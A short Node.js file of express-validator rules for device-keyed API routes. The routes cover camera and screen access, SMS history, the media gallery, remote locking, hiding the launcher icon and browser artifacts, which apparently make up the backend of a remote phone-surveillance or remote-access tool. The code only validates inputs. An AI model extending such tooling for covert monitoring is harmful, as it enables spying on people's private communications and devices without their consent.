const { body, param, query } = require('express-validator');

const validateCameraAccess = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
];

const validateScreenAccess = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
];

const validateSmsHistory = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
  
  query('limit')
    .optional()
    .isInt({ min: 1, max: 500 }).withMessage('Limit must be between 1 and 500'),
  
  query('page')
    .optional()
    .isInt({ min: 1 }).withMessage('Page must be a positive integer'),
];

const validateGallery = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
  
  query('type')
    .optional()
    .isIn(['image', 'video', 'all']).withMessage('Invalid media type'),
  
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 }).withMessage('Limit must be between 1 and 100'),
  
  query('page')
    .optional()
    .isInt({ min: 1 }).withMessage('Page must be a positive integer'),
];

const validateDeviceLock = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
  
  body('message')
    .optional()
    .trim()
    .isLength({ max: 500 }).withMessage('Message cannot exceed 500 characters'),
];

const validateLauncherVisibility = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
  
  body('visibility')
    .notEmpty().withMessage('Visibility is required')
    .isBoolean().withMessage('Visibility must be a boolean'),
];

const validateBrowserArtifacts = [
  param('deviceId')
    .trim()
    .notEmpty().withMessage('Device ID is required'),
];

module.exports = {
  validateCameraAccess,
  validateScreenAccess,
  validateSmsHistory,
  validateGallery,
  validateDeviceLock,
  validateLauncherVisibility,
  validateBrowserArtifacts,
};
